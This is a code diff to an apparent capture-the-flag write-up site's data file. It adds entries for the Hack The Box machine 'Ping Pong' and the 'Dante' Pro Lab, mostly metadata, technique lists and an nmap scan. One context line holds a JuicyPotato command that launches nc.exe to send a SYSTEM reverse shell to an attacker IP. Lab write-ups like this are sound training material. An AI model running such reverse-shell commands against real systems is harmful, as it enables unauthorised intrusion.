@@ -527,7 +527,7 @@ Pass-the-Hash with Administrator hash yields SYSTEM access.
     platform: "HTB",
     difficulty: "Hard",
     os: "Active Directory",
-    tags: ["Active Directory", "RPC", "SMB", "Forensics", "LSASS", "Privilege Escalation"],
+    tags: ["ActiveDirectory", "SMB", "ASREPRoasting", "BloodHound", "ForceChangePassword", "LSASS", "Pypykatz", "BackupOperators", "Diskshadow", "NTDS", "SecretsDump", "Evil-WinRM", "RPC", "Forensics", "Privilege Escalation", "CTF"],
     datePublished: "2024-07-04",
     retirementDate: "2026-11-15", // In future -> GATED ACTIVE MACHINE
     isRetired: false,
@@ -667,6 +667,64 @@ JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a "/c nc.exe 10.50.x.
 \`\`\`
 
 Catches reverse shell as \`NT AUTHORITY\\SYSTEM\`.
+`
+  },
+  {
+    slug: "htb-ping-pong",
+    title: "Ping Pong",
+    platform: "HTB",
+    difficulty: "Insane",
+    os: "Windows",
+    tags: ["Insane", "CTF", "Active Directory", "AD CS", "RBCD", "JEA", "GMSA", "MSSQL", "GodPotato"],
+    datePublished: "2026-06-29",
+    retirementDate: "2026-11-20",
+    isRetired: false,
+    points: 30,
+    featured: false,
+    initialAccessVector: "Initial reconnaissance and foothold.",
+    privEscVector: "Internal privilege escalation to root/administrator.",
+    summary: "Ping Pong walkthrough and machine exploitation report.",
+    previewContent: `## 1. Initial Reconnaissance
+
+PingPong is an Insane difficulty Windows machine demonstrating cross-forest trust exploitation, multiple AD CS attacks (ESC13, ESC4), Resource-Based Constrained Delegation (RBCD), Just Enough Administration (JEA) abuse, GMSA extraction with AES keys, MSSQL command execution, and privilege escalation via GodPotato.
+
+\`\`\`bash
+$ nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985 10.129.35.203
+\`\`\`
+`,
+    content: `## 1. Initial Reconnaissance
+
+PingPong is an Insane difficulty Windows machine demonstrating cross-forest trust exploitation, multiple AD CS attacks (ESC13, ESC4), Resource-Based Constrained Delegation (RBCD), Just Enough Administration (JEA) abuse, GMSA extraction with AES keys, MSSQL command execution, and privilege escalation via GodPotato.
+`
+  },
+  {
+    slug: "htb-dante",
+    title: "Dante",
+    platform: "HTB Pro Lab",
+    difficulty: "Insane",
+    os: "Multi",
+    tags: ["Pro Lab", "Dante", "Active Directory", "Pivoting", "Lateral Movement", "Enterprise AD"],
+    datePublished: "2026-06-24",
+    retirementDate: null,
+    isRetired: false,
+    isProLab: true,
+    points: 100,
+    featured: false,
+    initialAccessVector: "Multi-vector perimeter breach via external web services",
+    privEscVector: "Cross-realm Kerberos delegation, local kernel/SUID exploitation, and Tier-0 domain controller takeover",
+    summary: "Comprehensive 14-host corporate environment simulation testing Active Directory exploitation, cross-subnet pivoting, Linux privilege escalation, and domain forest compromise.",
+    previewContent: `## Pro Lab Overview: Dante
+
+**Dante** is a realistic corporate network simulation designed to replicate an enterprise infrastructure with multiple segregated subnets, Windows Active Directory domains, Linux server bastions, and legacy internal services.
+
+### Network Scope & Objectives
+- **Target Hosts:** 14 Vulnerable Machines across multiple VLANs
+- **Domains:** Enterprise Active Directory Forests & External DMZ
+- **Key Competencies:** Advanced Network Pivoting, Exploit Development, Lateral Movement, AD CS Abuse, and Domain Admin Takeover
+`,
+    content: `## Pro Lab Overview: Dante
+
+**Dante** is a realistic corporate network simulation designed to replicate an enterprise infrastructure with multiple segregated subnets, Windows Active Directory domains, Linux server bastions, and legacy internal services.
 `
   }
 ];
